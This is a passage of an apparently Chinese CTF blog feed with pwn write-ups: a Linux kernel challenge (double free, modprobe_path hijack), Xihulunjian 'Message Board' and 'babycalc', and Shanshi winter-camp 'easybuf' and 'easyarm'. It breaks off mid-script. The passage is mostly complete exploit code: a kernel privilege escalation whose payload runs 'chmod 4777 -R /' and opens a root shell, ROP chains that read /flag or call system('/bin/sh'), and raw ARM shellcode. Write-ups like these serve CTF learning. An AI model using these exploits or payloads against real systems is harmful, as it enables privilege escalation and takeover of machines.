class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">uint64_t</span> kernel_base, modprobe_path;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">arg</span>&#123;</span><br>    u_int idx;<br>    u_int size;<br>    <span class="hljs-type">char</span> *buf;<br>&#125;parm;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">shmid_open</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> shmid;<br><span class="hljs-keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="hljs-number">100</span>,<span class="hljs-number">0600</span>))==<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Shmget Error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *shmaddr=shmat(shmid,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (shmaddr==(<span class="hljs-type">void</span>*)<span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X] Shmat Error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">return</span> shmid;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,u_int idx,u_int size,<span class="hljs-type">char</span> *buf)</span>&#123;<br>    parm note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0xDEADBEEF</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> idx)</span>&#123;<br>    parm note = &#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(fd,<span class="hljs-number">0xC0DECAFE</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak_kernel_base</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> *buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>    <span class="hljs-type">uint64_t</span> *recv_msg=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>    <span class="hljs-type">int</span> qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg</span> *<span class="hljs-title">message</span>=</span>(<span class="hljs-keyword">struct</span> msg*)buf;<br>    <span class="hljs-type">int</span> size=<span class="hljs-number">0x1018</span>;<br><br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x2000</span>);<br><br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    del(fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x2000</span>);<br>    qid=msgget(IPC_PRIVATE,<span class="hljs-number">0666</span>|IPC_CREAT);<br>    msgsnd(qid,message,size<span class="hljs-number">-0x30</span>,<span class="hljs-number">0</span>);<br>    del(fd,<span class="hljs-number">0</span>);<span class="hljs-comment">//doublefree</span><br>    shmid_open();<br>    msgrcv(qid,(<span class="hljs-type">char</span>*)recv_msg,size,<span class="hljs-number">0</span>,IPC_NOWAIT|MSG_NOERROR);<br>    Hexdump(recv_msg,<span class="hljs-number">0x200</span>*<span class="hljs-number">8</span>);<br>    kernel_base = recv_msg[<span class="hljs-number">0x1fb</span>] - <span class="hljs-number">0x19ac6c0</span>;<br>    modprobe_path = kernel_base + <span class="hljs-number">0x18510a0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel_base = 0x%lx\n&quot;</span>, kernel_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path = 0x%lx\n&quot;</span>, modprobe_path);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/qyq&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">AAW</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">uint64_t</span> *buf=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    del(fd,<span class="hljs-number">0</span>);<br>    del(fd,<span class="hljs-number">0</span>);<br>    buf[<span class="hljs-number">0x2</span>] =modprobe_path;<br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">strcpy</span>(buf,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br><br>    add(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,buf);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    fd=open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)&#123;<br>        errExit(<span class="hljs-string">&quot;[X]fd open&quot;</span>);<br>    &#125;<br>    leak_kernel_base();<br>    AAW();<br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684595083712.png" alt="2"></p><h4 id="0x5参考">0x5参考</h4><p><a href="https://kagehutatsu.com/?p=778">2023 RealworldCTF 体验赛 部分WP-Pwn影二つ的博客 (kagehutatsu.com)</a></p><p><a href="https://kagehutatsu.com/?p=526">https://kagehutatsu.com/?p=526</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023西湖论剑线上赛pwn</title>
    <link href="/2023/02/02/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/"/>
    <url>/2023/02/02/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>有些题太难了，是完全不会。</p><h2 id="Message-Board">Message Board</h2><p>漏洞是格式化字符串,0x10的栈溢出</p><p>格式化字符串泄露栈和libc，栈迁移到前面执行布置的rop去orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">23492</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-string">&#x27;%p,%22$p&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x22c5e0</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><br>leave_ret=<span class="hljs-number">0x00000000004012e1</span><br>pop_rdi=<span class="hljs-number">0x0000000000401413</span><br>pop_rsi=libc_base+<span class="hljs-number">0x000000000002601f</span><br>pop_rdx=libc_base+<span class="hljs-number">0x0000000000142c92</span><br><br>pd=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span><br>pd+=flat(pop_rdi,stack+<span class="hljs-number">0x10</span>,pop_rsi,<span class="hljs-number">0</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">3</span>,pop_rsi,stack-<span class="hljs-number">0x100</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">1</span>,pop_rsi,stack-<span class="hljs-number">0x100</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br>pd=pd.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pd+=p64(stack+<span class="hljs-number">0x10</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>sa(<span class="hljs-string">&#x27;DASCTF:&#x27;</span>,pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="babycalc">babycalc</h2><p>覆盖最后一个变量能往指定偏移写字节</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">int <span class="hljs-selector-tag">i</span>; // <span class="hljs-selector-attr">[rsp+FCh]</span> <span class="hljs-selector-attr">[rbp-4h]</span><br></code></pre></td></tr></table></figure><p>配合这个</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-built_in">v0</span> = strtol(<span class="hljs-keyword">buf, </span><span class="hljs-number">0</span>LL, <span class="hljs-number">10</span>);<br>    *(&amp;v3 + i) = <span class="hljs-built_in">v0</span>;<br></code></pre></td></tr></table></figure><p>部分改写ret为leave_ret，栈迁移到前面，但每次都迁移的位置都不固定，用ret充当滑片，滑到rop链执行，分两次，一次泄露libc,一次system(binsh)</p><p>还有个off by null?</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">buf</span>[(int)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100uLL)] = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>要return的话要通过前面的一串计算，用z3库算一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./babycalc&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">23281</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><br>puts_got=<span class="hljs-number">0x602018</span><br>pop_rdi=<span class="hljs-number">0x0000000000400ca3</span><br>main=<span class="hljs-number">0x400c1a</span><br>ret=<span class="hljs-number">0x400c19</span><br><br>v3 = <span class="hljs-number">19</span><br>v4 = <span class="hljs-number">36</span><br>v5 = <span class="hljs-number">53</span><br>v6 = <span class="hljs-number">70</span><br>v7 = <span class="hljs-number">55</span><br>v8 = <span class="hljs-number">66</span><br>v9 = <span class="hljs-number">17</span><br>v10 = <span class="hljs-number">161</span><br>v11 = <span class="hljs-number">50</span><br>v12 = <span class="hljs-number">131</span><br>v13 = <span class="hljs-number">212</span><br>v14 = <span class="hljs-number">101</span><br>v15 = <span class="hljs-number">118</span><br>v16 = <span class="hljs-number">199</span><br>v17 = <span class="hljs-number">24</span><br>v18 = <span class="hljs-number">3</span><br><br>payload=<span class="hljs-string">b&quot;24aaaaaa&quot;</span><br>payload+=p64(ret)*<span class="hljs-number">21</span><br>payload+=flat(pop_rdi,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>],main+<span class="hljs-number">1</span>)<br>payload+=p8(v3)+p8(v4)+p8(v5)+p8(v6)+p8(v7)+p8(v8)+p8(v9)+p8(v10)+p8(v11)+p8(v12)+p8(v13)+p8(v14)+p8(v15)+p8(v16)+p8(v17)+p8(v18)<br>payload=payload.ljust(<span class="hljs-number">0xf8</span>+<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p32(<span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&quot;:&quot;</span>,payload)<br><br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base: &#x27;</span>,libc_base)<br>binsh=libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=<span class="hljs-string">b&quot;24aaaaaa&quot;</span><br>payload+=p64(ret)*<span class="hljs-number">21</span><br>payload+=flat(pop_rdi,binsh,system,main+<span class="hljs-number">1</span>)<br>payload+=p8(v3)+p8(v4)+p8(v5)+p8(v6)+p8(v7)+p8(v8)+p8(v9)+p8(v10)+p8(v11)+p8(v12)+p8(v13)+p8(v14)+p8(v15)+p8(v16)+p8(v17)+p8(v18)<br>payload=payload.ljust(<span class="hljs-number">0xf8</span>+<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload+=p32(<span class="hljs-number">0x38</span>)<br>sea(<span class="hljs-string">&quot;:&quot;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
      <tag>orw</tag>
      
      <tag>Stack migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023山石冬令营pwn</title>
    <link href="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/"/>
    <url>/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>山石的冬令营，放个<a href="https://pan.baidu.com/s/1_NjENG8Vb2czIiFWFbiQZA?pwd=cy6y">题目附件</a></p><h2 id="easybuf">easybuf</h2><p>数组越界任意写，劫持sleep为后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./easybuf&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;10.10.30.13&#x27;</span>,<span class="hljs-number">30006</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>backdoor=<span class="hljs-number">0x40125c</span><br>sleep=<span class="hljs-number">0x403598</span><br>sl(<span class="hljs-string">&quot;Y&quot;</span>)<br>sl(<span class="hljs-string">&#x27;-3&#x27;</span>)<br><span class="hljs-comment">#debug(&quot;b*strcpy&quot;)</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&#x27;\x5c\x12\x40&#x27;</span>)<br>sl(<span class="hljs-string">&quot;Y&quot;</span>)<br>sl(<span class="hljs-string">&#x27;666&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;EASYBUF&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="easyarm">easyarm</h2><p>32位arm下的ret2shellcode</p><p>要短一点的shellcode，要求小于0x32字节,这个0x22字节</p><blockquote><p>\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&quot;./easyarm&quot;</span><br>r=process([<span class="hljs-string">&quot;qemu-arm&quot;</span>,<span class="hljs-string">&quot;./easyarm&quot;</span>])<br><span class="hljs-comment">#r=remote(&quot;10.10.30.13&quot;, 30008)</span><br>context.arch=<span class="hljs-string">&quot;arm&quot;</span><br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>shellcode=<span 